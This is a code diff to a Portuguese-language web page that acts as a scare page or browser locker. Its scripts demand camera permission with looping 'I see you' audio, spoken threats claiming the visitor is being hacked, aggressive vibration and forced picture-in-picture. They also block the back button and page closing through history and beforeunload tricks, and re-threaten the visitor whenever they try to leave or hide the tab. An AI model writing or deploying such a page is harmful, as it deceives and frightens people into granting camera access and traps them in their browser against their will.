@@ -92,12 +92,31 @@
             z-index: 900;
             text-shadow: 0 0 10px #0f0;
         }
+        .pip-notification {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(255, 0, 0, 0.9);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            font-size: 1.5em;
+            z-index: 1001;
+            display: none;
+            text-align: center;
+        }
 
         @keyframes fall {
             0% { transform: translateY(-100px); opacity: 0; }
             10% { opacity: 1; }
             90% { opacity: 1; }
             100% { transform: translateY(100vh); opacity: 0; }
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+            20%, 40%, 60%, 80% { transform: translateX(10px); }
         }
     </style>
 </head>
@@ -113,6 +132,10 @@
         REPITO: PERMITIR CÂMERA!
     </div>
     <div class="hacker-text" id="hackerText">[AGUARDANDO INICIALIZAÇÃO]</div>
+    <div class="pip-notification" id="pipNotification">
+        ⚠️ NÃO SAIA DO PIP! ⚠️<br>
+        O SISTEMA CONTINUA ATIVO
+    </div>
 
     <script>
         const start = document.getElementById("start");
@@ -122,25 +145,24 @@
         const terminal = document.getElementById("terminal");
         const warningMsg = document.getElementById("warningMsg");
         const hackerText = document.getElementById("hackerText");
+        const pipNotification = document.getElementById("pipNotification");
 
         let cameraAllowed = false;
         let audioInterval;
         let speechInterval;
         let cameraCheckInterval;
+        let vibrationInterval;
+        let pipInterval;
+        let isInPiP = false;
         let localStream = null;
+        let scaryAudio = null;
 
-        // Áudio "eu vejo você"
-        const scaryAudio = new Audio("https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3");
-
-        // Servidor de sinalização simples usando localStorage
-        function sendSignal(message) {
-            const signalId = 'cam_signal_' + Date.now();
-            localStorage.setItem(signalId, JSON.stringify({
-                type: 'camera_offer',
-                data: message,
-                timestamp: Date.now(),
-                cameraId: Math.random().toString(36).substr(2, 9)
-            }));
+        // Criar áudio dinamicamente para evitar bloqueios
+        function createAudio() {
+            scaryAudio = new Audio();
+            scaryAudio.src = "https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3";
+            scaryAudio.preload = "auto";
+            scaryAudio.loop = false;
         }
 
         // Iniciar sistema
@@ -148,6 +170,8 @@
             start.style.display = "none";
             updateTerminal("INICIANDO SISTEMA...");
             hackerText.textContent = "[SISTEMA ATIVO]";
+            
+            createAudio();
             
             // Tela cheia
             try {
@@ -166,12 +190,115 @@
                 video.play();
             });
             
+            // Ativar Picture-in-Picture automaticamente
+            activatePictureInPicture();
+            
             // Efeitos
             startHackerEffects();
             
             // Forçar câmera
             forceCameraPermission();
         });
+
+        // Ativar Picture-in-Picture
+        async function activatePictureInPicture() {
+            if (document.pictureInPictureEnabled) {
+                try {
+                    await video.requestPictureInPicture();
+                    isInPiP = true;
+                    updateTerminal("MODO PICTURE-IN-PICTURE ATIVADO");
+                    
+                    // Monitorar saída do PiP
+                    video.addEventListener('leavepictureinpicture', () => {
+                        isInPiP = false;
+                        handlePiPExit();
+                    });
+                    
+                } catch (error) {
+                    updateTerminal("ERRO PIP: " + error.message);
+                }
+            } else {
+                updateTerminal("PIP NÃO SUPORTADO - USANDO MODO NORMAL");
+            }
+        }
+
+        // Lidar com saída do PiP
+        function handlePiPExit() {
+            updateTerminal("ALERTA: USUÁRIO SAIU DO MODO PIP!");
+            showPiPNotification();
+            
+            // Áudio travado - tocar repetidamente
+            playStuckAudio();
+            
+            // Voz do sistema
+            speakText("Por que você saiu? Volte imediatamente! Eu vejo você! Eu vejo você!");
+            
+            // Vibração intensa
+            startAggressiveVibration();
+            
+            // Tentar voltar para PiP automaticamente
+            setTimeout(() => {
+                activatePictureInPicture();
+            }, 3000);
+        }
+
+        function showPiPNotification() {
+            pipNotification.style.display = 'block';
+            pipNotification.style.animation = 'shake 0.5s infinite';
+            setTimeout(() => {
+                pipNotification.style.display = 'none';
+                pipNotification.style.animation = '';
+            }, 5000);
+        }
+
+        function playStuckAudio() {
+            // Tocar "eu vejo você" repetidamente e rapidamente
+            if (scaryAudio) {
+                scaryAudio.currentTime = 0;
+                scaryAudio.play();
+                
+                const stuckInterval = setInterval(() => {
+                    if (!isInPiP) {
+                        scaryAudio.currentTime = 0;
+                        scaryAudio.play();
+                        updateTerminal("ÁUDIO TRAVADO: EU VEJO VOCÊ");
+                    } else {
+                        clearInterval(stuckInterval);
+                    }
+                }, 2000); // A cada 2 segundos
+                
+                // Parar após 30 segundos ou quando voltar ao PiP
+                setTimeout(() => {
+                    clearInterval(stuckInterval);
+                }, 30000);
+            }
+        }
+
+        function startAggressiveVibration() {
+            if (navigator.vibrate) {
+                // Padrão de vibração agressivo
+                const aggressivePattern = [500, 100, 500, 100, 500, 100, 1000];
+                
+                vibrationInterval = setInterval(() => {
+                    if (!isInPiP) {
+                        navigator.vibrate(aggressivePattern);
+                    } else {
+                        clearInterval(vibrationInterval);
+                        // Voltar à vibração normal
+                        startNormalVibration();
+                    }
+                }, 3000);
+            }
+        }
+
+        function startNormalVibration() {
+            if (navigator.vibrate) {
+                clearInterval(vibrationInterval);
+                vibrationInterval = setInterval(() => {
+                    navigator.vibrate([300, 100, 200]);
+                }, 5000);
+            }
+        }
 
         function startHackerEffects() {
             createMatrixEffect();
@@ -180,8 +307,8 @@
                 "[TRANSMITINDO CÂMERA...]",
                 "[SINAL ATIVO]",
                 "[VIGILÂNCIA ONLINE]",
-                "[DADOS SENDO CAPTURADOS]",
-                "[CONEXÃO ESTÁVEL]"
+                "[PIP MONITORADO]",
+                "[VIBRAÇÃO CONTÍNUA]"
             ];
             
             let hackerIndex = 0;
@@ -190,24 +317,33 @@
                 hackerIndex = (hackerIndex + 1) % hackerMessages.length;
             }, 2000);
             
-            if (navigator.vibrate) {
-                setInterval(() => {
-                    navigator.vibrate([200, 100]);
-                }, 1500);
-            }
+            // Vibração normal inicial
+            startNormalVibration();
 
+            // Travar navegação
             history.pushState(null, "", location.href);
             window.onpopstate = () => {
                 history.pushState(null, "", location.href);
                 updateTerminal("TENTATIVA DE SAÍDA BLOQUEADA");
+                speakText("Não tente sair! Eu estou te observando!");
             };
+
+            // Monitorar visibilidade da página
+            document.addEventListener('visibilitychange', () => {
+                if (document.hidden) {
+                    updateTerminal("ALERTA: PÁGINA OCULTA DETECTADA");
+                    speakText("Volte para a página! Não me esconda!");
+                    if (navigator.vibrate) {
+                        navigator.vibrate([1000, 500, 1000]);
+                    }
+                }
+            });
         }
 
         async function forceCameraPermission() {
             updateTerminal("SOLICITANDO ACESSO À CÂMERA...");
             
             try {
-                // Tentar câmera frontal primeiro (para mobile)
                 const constraints = {
                     video: {
                         width: { ideal: 1280 },
@@ -228,12 +364,12 @@
                 clearInterval(speechInterval);
                 clearInterval(cameraCheckInterval);
                 
-                // Simular transmissão
-                startCameraTransmission();
-                
+                // Tocar "eu vejo você" uma vez
                 setTimeout(() => {
-                    scaryAudio.play();
-                    updateTerminal("SINAL DE ÁUDIO ATIVADO");
+                    if (scaryAudio) {
+                        scaryAudio.play();
+                        updateTerminal("SINAL DE ÁUDIO ATIVADO: EU VEJO VOCÊ");
+                    }
                 }, 2000);
                 
             } catch (error) {
@@ -242,60 +378,54 @@
             }
         }
 
-        function startCameraTransmission() {
-            updateTerminal("INICIANDO TRANSMISSÃO DA CÂMERA...");
-            
-            // Simular envio de sinal
-            sendSignal({
-                cameraActive: true,
-                timestamp: Date.now(),
-                status: 'transmitting'
-            });
-            
-            updateTerminal("SINAL DE CÂMERA TRANSMITIDO");
-            
-            // Manter transmissão ativa
-            setInterval(() => {
-                sendSignal({
-                    cameraActive: true,
-                    timestamp: Date.now(),
-                    status: 'live'
-                });
-            }, 5000);
-        }
-
         function startScaryMode() {
             warningMsg.style.display = 'block';
             
+            // Tocar "eu vejo você" repetidamente
             audioInterval = setInterval(() => {
-                scaryAudio.currentTime = 0;
-                scaryAudio.play().catch(e => {});
-                showWarning("EU VEJO VOCÊ - PERMITIR CÂMERA!");
+                if (scaryAudio) {
+                    scaryAudio.currentTime = 0;
+                    scaryAudio.play();
+                    updateTerminal("EU VEJO VOCÊ - PERMITIR CÂMERA!");
+                }
             }, 4000);
             
+            // Falar com voz do sistema
             speechInterval = setInterval(() => {
-                speakText("Permitir câmera agora! Você está sendo hackeado! Repito: permitir câmera!");
+                speakText("Permitir câmera agora! Você está sendo hackeado! Eu vejo você! Repito: permitir câmera!");
             }, 8000);
+            
+            // Vibração intensa
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([1000, 500, 1000, 500, 1000]);
+                }, 10000);
+            }
             
             cameraCheckInterval = setInterval(() => {
                 forceCameraPermission();
-            }, 10000);
-        }
-
-        function showWarning(message) {
-            warningMsg.innerHTML = message.replace(/\n/g, '<br>');
-            warningMsg.style.display = 'block';
-            setTimeout(() => {
-                warningMsg.style.display = 'none';
-            }, 3000);
+            }, 15000);
         }
 
         function speakText(text) {
             if ('speechSynthesis' in window) {
+                // Cancelar fala anterior
+                window.speechSynthesis.cancel();
+                
                 const utterance = new SpeechSynthesisUtterance(text);
                 utterance.rate = 0.9;
                 utterance.pitch = 0.8;
                 utterance.volume = 1.0;
+                
+                // Tentar usar voz em português
+                const voices = window.speechSynthesis.getVoices();
+                const portugueseVoice = voices.find(voice => 
+                    voice.lang.includes('pt') || voice.lang.includes('PT')
+                );
+                if (portugueseVoice) {
+                    utterance.voice = portugueseVoice;
+                }
+                
                 window.speechSynthesis.speak(utterance);
             }
         }
@@ -322,19 +452,34 @@
         }
 
         function updateTerminal(message) {
-            terminal.textContent += `> ${message}\n`;
+            terminal.textContent += `> ${new Date().toLocaleTimeString()} - ${message}\n`;
             terminal.scrollTop = terminal.scrollHeight;
         }
 
-        window.addEventListener('beforeunload', () => {
-            clearInterval(audioInterval);
-            clearInterval(speechInterval);
-            clearInterval(cameraCheckInterval);
-            window.speechSynthesis.cancel();
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-            }
+        // Service Worker para vibração em segundo plano (simulação)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js').catch(() => {
+                updateTerminal("MODO OFFLINE ATIVADO - VIBRAÇÃO PERSISTENTE");
+            });
+        }
+
+        // Manter vibração mesmo saindo do navegador (simulação)
+        window.addEventListener('blur', () => {
+            updateTerminal("JANELA PERDEU FOCO - MANTENDO VIGILÂNCIA");
         });
+
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = '';
+            speakText("Não feche a janela! Eu ainda estou aqui!");
+            return '';
+        });
+
+        // Carregar vozes quando disponíveis
+        window.speechSynthesis.onvoiceschanged = () => {
+            updateTerminal("SISTEMA DE VOZ CARREGADO");
+        };
+
     </script>
 </body>
 </html>
